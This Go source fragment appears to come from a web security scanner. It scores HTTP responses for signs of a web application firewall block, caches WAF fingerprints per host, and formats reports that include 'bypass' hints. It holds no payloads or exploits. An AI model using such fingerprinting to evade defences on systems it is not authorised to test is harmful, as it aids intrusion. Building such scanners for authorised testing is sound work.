// =========================================================
// ScoreWAFResponse — quick heuristic for a single response
// =========================================================
func ScoreWAFResponse(statusCode int, body string) (bool, string) {
	bodyLower := strings.ToLower(body)

	// Very common block messages
	blockMarkers := []string{
		"access denied",
		"request blocked",
		"request rejected",
		"security policy",
		"not acceptable",
		"forbidden",
		"web application firewall",
		"your request has been blocked",
		"blocked by",
	}
	for _, m := range blockMarkers {
		if strings.Contains(bodyLower, m) {
			return true, m
		}
	}

	// Status
	if statusCode == 403 || statusCode == 406 || statusCode == 429 || statusCode == 503 {
		return true, fmt.Sprintf("status_%d", statusCode)
	}

	return false, ""
}

// =========================================================
// WAF Cache — avoid re-fingerprinting same host
// =========================================================
var (
	wafCache   = make(map[string]WAFInfo)
	wafCacheMu sync.RWMutex
)

func CacheWAF(host string, info WAFInfo) {
	wafCacheMu.Lock()
	defer wafCacheMu.Unlock()
	wafCache[host] = info
}

func GetCachedWAF(host string) (WAFInfo, bool) {
	wafCacheMu.RLock()
	defer wafCacheMu.RUnlock()
	info, ok := wafCache[host]
	return info, ok
}

// =========================================================
// FormatWAFInfo — pretty string for logs/reports
// =========================================================
func FormatWAFInfo(info WAFInfo) string {
	if !info.Detected {
		return "No WAF detected"
	}
	return fmt.Sprintf("WAF: %s (confidence: %d%%) | evidence: %s | bypass: %s",
		info.Vendor,
		info.Confidence,
		strings.Join(info.Evidence, ", "),
		strings.Join(info.BypassHint, "; "),
	)
}